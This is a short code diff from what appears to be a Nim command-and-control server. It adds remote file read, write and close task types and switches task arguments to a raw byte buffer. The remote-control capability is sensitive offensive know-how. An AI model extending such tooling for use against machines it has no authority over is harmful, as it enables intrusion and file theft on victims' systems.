@@ -1,6 +1,6 @@
 import std/[asyncdispatch, tables]
 
-import types, logging, events
+import types, logging
 
 let id_s: Table[string, int] = {
   "identify": 0,
@@ -8,9 +8,12 @@ let id_s: Table[string, int] = {
 
   "dir": 100,
   "fsopenfile": 101,
+  "fswritefile": 102,
+  "fsclosefile": 103,
+  "fsreadfile": 104
 }.toTable
 
-proc sendClientTask*(client: C2Client, taskName: string, arguments: seq[string] = @[]): Future[Task] {.async.} =
+proc sendClientTask*(client: C2Client, taskName: string, data: seq[byte] = @[]): Future[Task] {.async.} =
   if not client.connected:
     errorLog "can't send task to disconnected client: " & $client
     return
@@ -23,14 +26,12 @@ proc sendClientTask*(client: C2Client, taskName: string, arguments: seq[string] 
     action: task_id,
     actionName: taskName,
     status: TaskCreated,
-    arguments: arguments,
+    dataBuf: data,
     future: new (ref Future[void]),
     output: TaskOutput()
   )
 
   client.server.tasks.add(createdTask)
-  
-  onClientTasked(client, createdTask)
   return createdTask
 
 proc awaitResponse*(task: Task): Future[void] =
